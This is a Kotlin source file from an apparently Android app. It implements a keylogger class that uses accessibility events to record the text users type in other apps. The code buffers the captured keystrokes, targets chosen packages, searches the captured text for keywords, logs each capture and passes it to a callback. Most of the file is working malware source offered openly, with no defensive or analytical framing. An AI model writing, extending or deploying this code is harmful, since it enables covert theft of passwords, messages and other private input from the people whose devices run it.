// ============================================================
// FILE: android/app/src/main/java/com/xrc/sensors/Keylogger.kt
// ============================================================
package com.xrc.sensors

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

/**
 * Keylogger — captures keystrokes via AccessibilityService.
 *
 * Works by monitoring AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
 * and TYPE_VIEW_TEXT_SELECTION_CHANGED events.
 * Requires accessibility service binding.
 */
class Keylogger {
    companion object {
        private const val TAG = "Keylogger"
        private const val MAX_BUFFER_SIZE = 10000
    }

    private val buffer = StringBuilder()
    private val targetPackages = mutableSetOf<String>()

    /**
     * Process an accessibility event for keylogging.
     */
    fun processEvent(event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        // Check if package is targeted
        val pkg = event.packageName?.toString() ?: return
        if (targetPackages.isNotEmpty() && pkg !in targetPackages) return

        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return

        synchronized(buffer) {
            // Append with timestamp and source info
            val sourceTag = pkg.substringAfterLast(".").take(15)
            buffer.append("[${sourceTag}] $text")
            if (buffer.length > MAX_BUFFER_SIZE) {
                buffer.delete(0, buffer.length - MAX_BUFFER_SIZE)
            }
        }

        Log.d(TAG, "Keylog: [$pkg] $text")
        onKeyPress?.invoke(pkg, text)
    }

    /**
     * Get accumulated key buffer.
     */
    fun getBuffer(): String {
        synchronized(buffer) {
            return buffer.toString()
        }
    }

    /**
     * Clear key buffer.
     */
    fun clearBuffer() {
        synchronized(buffer) {
            buffer.clear()
        }
    }

    /**
     * Add package to target list (empty = all packages).
     */
    fun addTarget(packageName: String) {
        targetPackages.add(packageName)
    }

    /**
     * Remove package from target list.
     */
    fun removeTarget(packageName: String) {
        targetPackages.remove(packageName)
    }

    /**
     * Set target packages (replaces all).
     */
    fun setTargets(packages: List<String>) {
        targetPackages.clear()
        targetPackages.addAll(packages)
    }

    /**
     * Get current target packages.
     */
    fun getTargets(): Set<String> = targetPackages.toSet()

    /**
     * Search buffer for keywords.
     */
    fun search(keywords: List<String>): List<String> {
        synchronized(buffer) {
            val content = buffer.toString()
            return keywords.filter { content.contains(it, ignoreCase = true) }
        }
    }

    var onKeyPress: ((String, String) -> Unit)? = null
}
